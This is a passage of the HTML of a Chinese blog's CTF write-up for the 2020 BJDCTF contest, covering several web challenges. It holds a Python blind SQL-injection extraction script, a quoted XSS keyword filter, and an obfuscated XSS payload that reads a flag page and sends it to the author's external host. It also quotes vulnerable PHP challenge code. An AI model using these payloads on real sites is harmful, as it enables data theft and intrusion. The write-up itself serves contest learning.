class="line">    burp0_headers = &#123;<span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    r=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,params=param)</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    <span class="built_in">print</span>(param)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;/static/img/dundundun.gif&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;filter &quot;</span>,param)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;y1ng&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#database: ms</span></span><br><span class="line"><span class="comment">#mysql,sys</span></span><br><span class="line"><span class="comment">#Hint: /Source Password</span></span><br><span class="line"><span class="comment">#table:gtid_executed,sys_config</span></span><br><span class="line">result=<span class="string">&quot;12,Hint: /Source Password: T1Me&quot;</span></span><br><span class="line">pos=<span class="built_in">len</span>(result)*<span class="number">2</span>+<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    flag=<span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">if</span> sqlinj(<span class="built_in">ord</span>(i)):</span><br><span class="line">            result+=i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Found:&quot;</span>+result)</span><br><span class="line">            flag=<span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;result:&quot;</span>+result)</span><br><span class="line">    pos+=<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> flag <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>





<h2 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h2><p><a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p>flag.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] === <span class="string">&#x27;172.26.176.2&#x27;</span>) <span class="comment">//only admin, who is at 172.26.176.2, can get FLAG</span></span><br><span class="line">    <span class="keyword">echo</span> FLAG;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>bot脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;captcha&#x27;</span>]) ) &#123; <span class="comment">// report bug to our admin who is at 172.26.176.2, our admin will access the bug url to check</span></span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$captcha</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;captcha&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ( checkNote(<span class="variable">$url</span>) &amp;&amp; checkNote(urldecode(<span class="variable">$url</span>)) &amp;&amp; checkURL(<span class="variable">$url</span>) &amp;&amp;  substr(md5(<span class="variable">$captcha</span>), <span class="number">0</span> , <span class="number">6</span>) === <span class="variable">$_SESSION</span>[<span class="string">&#x27;captcha&#x27;</span>] ) &#123;</span><br><span class="line">        <span class="comment">//admin checking, it will take several seconds</span></span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> alertMes(<span class="string">&#x27;something wrong&#x27;</span>, <span class="string">&#x27;./report_bugs.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkURL</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[|~`^;&amp;]/m&#x27;</span>, <span class="variable">$url</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNote</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/show|svg|archive|error|eval|on|atob|\\\u|&amp;#|let|cookie|meta|create|fetch|f[^a-z]*l[^a-z]*a[^a-z]*g|src|append|&lt;script&gt;|func|javascript|res|lo|then|ftp|const|ajax|\$|\&#x27;|\&quot;/imX&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="variable">$filter</span>, <span class="variable">$s</span>) || strlen(<span class="variable">$s</span>) &gt;= <span class="number">500</span> || strlen(<span class="variable">$s</span>) &lt;= <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>csp:<code>Content-Security-Policy: default-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;; img-src &#39;self&#39;; object-src &#39;none&#39;; require-trusted-types-for &#39;script&#39;;</code></p>
<p>绕过</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script &gt;xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp[<span class="string">`\x6fnreadystatechange`</span>]=<span class="function">()=&gt;</span>&#123;<span class="keyword">if</span>(xmlhttp.readyState==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)&#123;<span class="built_in">document</span>[<span class="string">`\x6cocati\x6fn`</span>][<span class="string">`href`</span>]=<span class="string">`http://ccreat\x65r.top:60006/`</span>+xmlhttp[<span class="string">`\x72espo\x6eseText`</span>];&#125;&#125;;xmlhttp.open(<span class="string">`GET`</span>,<span class="string">`/lib\x2ffla\x67.php`</span>,<span class="literal">true</span>);xmlhttp.send();&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>拿到flag</p>
<h2 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h2><p> <a target="_blank" rel="noopener" href="http://183.129.189.60:10057/">http://183.129.189.60:10057/</a> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/flag.php</span><br><span class="line">/index.php</span><br><span class="line">/log.php</span><br><span class="line">/login.php</span><br><span class="line">/www.zip</span><br></pre></td></tr></table></figure>

<p>flag.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag.php关键代码如下：</span><br><span class="line"><span class="variable">$classname</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;classname&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="variable">$classname</span>(<span class="variable">$data</span>[<span class="string">&#x27;a&#x27;</span>], <span class="variable">$data</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line">Only users <span class="keyword">from</span> the website can request this page. flag in /flag, have fun!</span><br></pre></td></tr></table></figure>



<p>先登陆康康,需要key,相关代码在:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	session_start();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getkey</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		<span class="variable">$chars</span> = str_split(<span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">48</span>; <span class="variable">$i</span>++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$key</span> = <span class="variable">$key</span> . <span class="variable">$chars</span>[random_int(<span class="number">0</span>, <span class="number">61</span>)];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;key&#x27;</span>] = <span class="variable">$key</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$key</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getreferer</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="built_in">static</span> <span class="variable">$referer</span>;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])) &#123;</span><br><span class="line">				<span class="variable">$referer</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">elseif</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;URL_REFERER&#x27;</span>]))&#123;</span><br><span class="line">				<span class="variable">$referer</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;URL_REFERER&#x27;</span>];</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;Where are you from?&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$referer</span>;</span><br><span class="line">	&#125;</span><br><span class="line">		<span class="variable">$key</span> = getkey();</span><br><span class="line">		<span class="variable">$url</span> = getreferer();</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&quot;/^http[s]&#123;0,1&#125;:\/\//i&quot;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;What do you want to do?&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$host</span> = parse_url(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&quot;/^google\.com$/i&quot;</span>, <span class="variable">$host</span>) <span class="keyword">or</span> preg_match(<span class="string">&quot;/(.*)\.google\.com$/i&quot;</span>, <span class="variable">$host</span>))&#123;</span><br><span class="line">			<span class="variable">$headers</span> = get_headers(<span class="variable">$url</span>,<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$headers</span>[<span class="string">&#x27;dd&#x27;</span>] === <span class="string">&#x27;MeAquaNo_1!!!&#x27;</span>)&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="variable">$key</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&#x27;dd beheading!&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;Only dd working at Google can get the key!&quot;</span>);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>





<h2 id="老开发"><a href="#老开发" class="headerlink" title="老开发"></a>老开发</h2><p> <a target="_blank" rel="noopener" href="http://183.129.189.60:10000/">http://183.129.189.60:10000/</a> </p>
<p><img src="C:\Users\蔡建斌\AppData\Roaming\Typora\typora-user-images\image-20200523230022093.png" alt="image6583"></p>
<p><img src="C:\Users\蔡建斌\AppData\Roaming\Typora\typora-user-images\image-20200523230029887.png" alt="image6695"></p>
<p>User.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>] == <span class="keyword">__FILE__</span>)</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Entity</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Table</span>(name=&quot;user&quot;)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/** </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Id</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Column</span>(type=&quot;integer&quot;)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@GeneratedValue</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$uid</span>;</span><br><span class="line">    <span class="comment">/** </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Column</span>(type=&quot;string&quot;) </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@unique</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="comment">/** </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Column</span>(type=&quot;string&quot;) </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="comment">/** </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Column</span>(type=&quot;string&quot;) </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$role</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (property_exists(<span class="keyword">__CLASS__</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Class &quot;</span> . <span class="keyword">__CLASS__</span> . <span class="string">&quot; doesn&#x27;t have property &quot;</span> . <span class="variable">$name</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (property_exists(<span class="keyword">__CLASS__</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Class &quot;</span> . <span class="keyword">__CLASS__</span> . <span class="string">&quot; doesn&#x27;t have property &quot;</span> . <span class="variable">$name</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="布吉岛"><a href="#布吉岛" class="headerlink" title="布吉岛"></a>布吉岛</h2><p> <a target="_blank" rel="noopener" href="http://183.129.189.60:10049/">http://183.129.189.60:10049/</a> </p>
<p> <a target="_blank" rel="noopener" href="http://183.129.189.60:10050/">http://183.129.189.60:10050/</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/05/23/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/" data-id="cku8ky2wq000ndnnf1nts7l2n" data-title="2020第三届BJDCTF" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 12px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 16px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 12px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 12px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 18px;">web</a> <a href="/tags/wp/" style="font-size: 20px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 12px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 14px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 10px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 12px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li 